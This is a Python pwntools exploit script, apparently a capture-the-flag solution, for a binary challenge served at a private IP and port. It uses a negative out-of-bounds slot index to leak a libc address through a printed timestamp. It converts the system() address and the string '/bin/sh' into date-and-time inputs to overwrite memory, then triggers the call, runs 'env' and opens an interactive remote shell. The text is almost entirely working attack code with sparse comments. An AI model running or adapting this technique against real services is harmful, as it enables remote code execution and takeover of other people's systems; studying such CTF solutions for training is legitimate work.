#!/usr/bin/env python3
from pwn import *
import binascii
import sys
import datetime
import time
import calendar
exe_path = './chall_patched'
HOST = '100.64.0.66'
PORT = 36339

exe = ELF(exe_path, checksec=False)
libc = ELF('./libc.so.6', checksec=False)
context.binary = exe
context.log_level = 'debug'
context.terminal = [
    'cmd.exe', '/c', 'start',
    'wt.exe', '-w', '0', 'split-pane', '-V',
    '-d', '.',
    'wsl.exe',
    '-d', 'kali-linux',
    'bash', '-c'
]

gdbscript = '''
brva 0x181a
c 
c 255
'''

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    p = process(exe.path)
    if args.GDB:
        gdb.attach(p, gdbscript=gdbscript)
        input()
    return p

p = start()

# add payload, script here
#oob leak libc exit.got -9 + stack -2

#qword_40A0 store timestamp
#qword_40F0 store num of idx
#qword_40F4 store num of neg idx
#timer

def to_timestamp(year, month, day, hour, minute, second):
    month_days = [31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31]
    def leap(y):
        return y % 4 == 0 and (y % 100 != 0 or y % 400 == 0)
    y = year - 1
    days = 365 * y + y // 4 - y // 100 + y // 400
    y_epoch = 1969
    days -= 365 * y_epoch + y_epoch // 4 - y_epoch // 100 + y_epoch // 400
    for i in range(month - 1):
        days += month_days[i]
    if month > 2 and leap(year):
        days += 1
    days += day - 1
    return days * 86400 + hour * 3600 + minute * 60 + second

def leak_addr():
    line = p.recvline().strip().decode()
    log.info(f"raw leak: {line}")

    parts = line.split()
    month_abbr = parts[1]
    day = int(parts[2])
    h, m, s = map(int, parts[3].split(":"))
    year = int(parts[4])

    months = {
        "Jan": 1, "Feb": 2, "Mar": 3, "Apr": 4, "May": 5, "Jun": 6,
        "Jul": 7, "Aug": 8, "Sep": 9, "Oct": 10, "Nov": 11, "Dec": 12
    }
    month = months[month_abbr]

    leak_utc = to_timestamp(year, month, day, h, m, s)
    TZ_OFFSET = 7 * 3600 
    
    real_leak = leak_utc - TZ_OFFSET
    base_addr = real_leak & 0xfffffffffffff000

    log.success(f"Recovered Address (Hex): {hex(real_leak)}")
    log.success(f"Base Address (Masked): {hex(base_addr)}")

    return base_addr

def generate_time_payload(target_val, is_remote=False):
    TZ_OFFSET = 0 if is_remote else 7 * 3600 
    target_sec = target_val + TZ_OFFSET
    
    s = target_sec % 60
    target_sec //= 60
    m = target_sec % 60
    target_sec //= 60
    h = target_sec % 24
    days = target_sec // 24
    
    days_shifted = days + 719162
    cycles = days_shifted // 146097
    rem = days_shifted % 146097
    
    y = cycles * 400 + 1
    
    def is_leap(year):
        return year % 4 == 0 and (year % 100 != 0 or year % 400 == 0)
    def days_in_year(year):
        return 366 if is_leap(year) else 365
    while rem >= days_in_year(y):
        rem -= days_in_year(y)
        y += 1
        
    month_days = [31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31]
    if is_leap(y):
        month_days[1] = 29
    mon = 1
    for d in month_days:
        if rem >= d:
            rem -= d
            mon += 1
        else:
            break
    day = rem + 1
    return y, mon, day, h, m, s

def set_timer(val, is_remote=False):
    y, mon, day, h, m, s = generate_time_payload(val, is_remote)

    p.sendlineafter(b'> ', b'2')

    p.sendlineafter(b'Year: ',   str(y).encode())
    p.sendlineafter(b'Month: ',  str(mon).encode())
    p.sendlineafter(b'Day: ',    str(day).encode())
    p.sendlineafter(b'Hour: ',   str(h).encode())
    p.sendlineafter(b'Minute: ', str(m).encode())
    p.sendlineafter(b'Second: ', str(s).encode())
    
# ==================================

for i in range(256):
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b'Select Variant Slot Index: ', b'-2')

p.sendlineafter(b'> ', b'1')
p.recvuntil(b'Current Timeline: ')

libc_base = leak_addr() - 0x203000
log.info(f"Leaked libc base: {hex(libc_base)}")

system = libc_base + 0x58750
bin_sh = b'/bin/sh\x00'
bin_sh = u64(bin_sh)

set_timer(system)
p.sendlineafter(b'> ', b'3')
p.sendlineafter(b'Select Variant Slot Index: ', b'-20')
set_timer(bin_sh)
p.sendlineafter(b'> ', b'3')
p.sendlineafter(b'Slot Index: ', b'0')

p.sendlineafter(b'> ', b'1')
p.sendline(b'env')

p.interactive()